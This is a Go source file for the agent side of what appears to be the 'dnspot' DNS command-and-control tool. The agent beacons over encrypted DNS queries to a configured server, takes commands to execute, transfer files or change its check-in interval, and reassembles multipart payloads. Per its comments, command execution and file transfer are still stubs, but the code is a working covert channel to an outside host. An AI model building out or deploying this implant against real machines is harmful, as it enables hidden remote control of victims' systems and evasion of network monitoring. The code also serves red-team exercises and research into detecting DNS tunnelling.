package agent

import (
	"encoding/binary"
	"strings"
	"time"

	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/conf"
	"github.com/mosajjal/dnspot/cryptography"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
)

func errorHandler(err error) {
	if err != nil {
		panic(err.Error())
	}
}

var exiting chan bool

// this is where all the multi-part packets will live
var PacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)

var AgentStatus struct {
	LastAckFromServer   uint32
	NextMessageType     c2.MessageType
	CurretBatchParentID uint16
	HealthCheckInterval time.Duration
	MessageTicker       *time.Ticker
}

func runCommand(packets []c2.MessagePacketWithSignature) error {
	fullPayload := make([]byte, 0)
	packets = c2.CheckMessageIntegrity(packets)
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	// for now it's not actually running. it's just bs
	log.Warnf("%s, coming from %s\n", fullPayload, packets[0].Signature.String())
	// todo: clean the memory for this parentpartID
	return nil
}

func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
	command := msgList[0] // todo: handle multiple commands at the same time?
	AgentStatus.LastAckFromServer = command.Msg.TimeStamp
	// log.Infof("%s", command.Msg.Payload) //todo: act on server's command here

	// execution for last/single packets
	switch msgType := command.Msg.MessageType; msgType {
	case c2.MessageHealthcheck:
		return nil // nothing to do. this means nothing needs to be changed
	case c2.MessageExecuteCommand:
		AgentStatus.NextMessageType = c2.MessageExecuteCommand

		// handle multipart incoming
		if command.Msg.ParentPartID != 0 { // multi part
			//fist and middle packets
			PacketBuffersWithSignature[int(command.Msg.ParentPartID)] = append(PacketBuffersWithSignature[int(command.Msg.ParentPartID)], command)
			if !command.Msg.IsLastPart {
				msg := c2.MessagePacket{
					TimeStamp:    uint32(time.Now().Unix()),
					MessageType:  AgentStatus.NextMessageType,
					ParentPartID: command.Msg.ParentPartID,
					PartID:       command.Msg.PartID,
				}
				payload := []byte("Ack!")
				// log.Infof("sending plyload %#v\n", msg)
				// time.Sleep(2 * time.Second)
				Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
				for _, Q := range Questions {
					if len(Q) < 255 {
						// todo: implement retry here
						// todo: handle response form server
						response, err := c2.PerformExternalAQuery(Q, conf.GlobalAgentConfig.ServerAddress)
						if err != nil {
							log.Warnf("Failed to send the payload %s", err)
						}
						msgList, _ := c2.DecryptIncomingPacket(response, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
						handleServerCommand(msgList)
					} else {
						log.Errorf("query is too big %d, can't send this...\n", len(Q))
					}
				}
				if err != nil {
					log.Warnf("Error sending Message to Server")
				}
				return nil
			}
		} else { // single packet
			PacketBuffersWithSignature[int(command.Msg.ParentPartID)] = append(PacketBuffersWithSignature[int(command.Msg.ParentPartID)], command)
		}
		runCommand(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
		return nil // todo
	case c2.MessageClientGetFile:
		return nil
	case c2.MessageClientSendFile:
		// I think below lines will mess up my set interval coming from server. this should be explicitly set from the server as well
		// log.Infof("Received command to upload a file to the server. Will adjust healthcheck interval to 1000 milliseconds and will adjust it further if the server demands it")
		// AgentStatus.HealthCheckInterval = 1 * time.Second //todo: make this configurable
		// AgentStatus.MessageTicker = time.NewTicker(time.Duration(AgentStatus.HealthCheckInterval) * time.Millisecond)
		// todo: start sending the payload bits to the server
		return nil
	case c2.MessageSetHealthInterval:
		log.Infof("Received command to explicitly set the healthcheck interval in milliseconds")
		// the time interval is packed in the lower 4 bytes of the message
		AgentStatus.HealthCheckInterval = time.Duration(binary.BigEndian.Uint32(command.Msg.Payload[0:4])) * time.Millisecond
		AgentStatus.MessageTicker = time.NewTicker(time.Duration(AgentStatus.HealthCheckInterval) * time.Millisecond)
		return nil
	case c2.MessageSyncTime:
		// throwing a warning for out of sync time for now
		log.Warnf("Time is out of Sync.. not touching system time but please go and fix it!")
		log.Warnf("UTC time coming from the server: %s", command.Msg.Payload)
		return nil
	}

	return nil
}

func RunAgent(cmd *cobra.Command, args []string) error {
	// set global flag that we're running as server
	conf.Mode = conf.RunAsAgent
	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
	AgentStatus.HealthCheckInterval = 10 * time.Second
	AgentStatus.NextMessageType = c2.MessageHealthcheck
	AgentStatus.MessageTicker = time.NewTicker(AgentStatus.HealthCheckInterval)

	// dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
	// errorHandler(err)
	if !strings.HasSuffix(conf.GlobalAgentConfig.DnsSuffix, ".") {
		conf.GlobalAgentConfig.DnsSuffix = conf.GlobalAgentConfig.DnsSuffix + "."
	}
	if !strings.HasPrefix(conf.GlobalAgentConfig.DnsSuffix, ".") {
		conf.GlobalAgentConfig.DnsSuffix = "." + conf.GlobalAgentConfig.DnsSuffix
	}
	// serverAddress, err := cmd.Flags().GetString("serverAddress")
	// errorHandler(err)
	// privateKey, err := cmd.Flags().GetString("privateKey")
	// errorHandler(err)
	// serverPublicKey, err := cmd.Flags().GetString("serverPublicKey")
	// errorHandler(err)
	var err error
	conf.GlobalAgentConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalAgentConfig.PrivateKeyB32)
	errorHandler(err)
	conf.GlobalAgentConfig.ServerPublicKey, err = cryptography.PublicKeyFromString(conf.GlobalAgentConfig.ServerPublicKeyB32)
	errorHandler(err)

	for {
		select {
		case <-exiting:
			// When exiting, return immediately
			return nil
		case <-AgentStatus.MessageTicker.C:
			if AgentStatus.NextMessageType == c2.MessageHealthcheck {
				msg := c2.MessagePacket{
					TimeStamp:   uint32(time.Now().Unix()),
					MessageType: AgentStatus.NextMessageType,
				}
				// set payload based on next message type?
				payload := []byte("Ping!")
				Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
				for _, Q := range Questions {
					if len(Q) < 255 {
						// todo: implement retry here
						// todo: handle response form server
						response, err := c2.PerformExternalAQuery(Q, conf.GlobalAgentConfig.ServerAddress)
						if err != nil {
							log.Warnf("Failed to send the payload %s", err)
						}
						msgList, _ := c2.DecryptIncomingPacket(response, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
						handleServerCommand(msgList)
					} else {
						log.Errorf("query is too big %d, can't send this...\n", len(Q))
					}
				}
				if err != nil {
					log.Warnf("Error sending Message to Server")
				}
			}
			// function to handle response coming from the server and update the status accordingly
			// handleServerResponse(response)
		}
	}
}
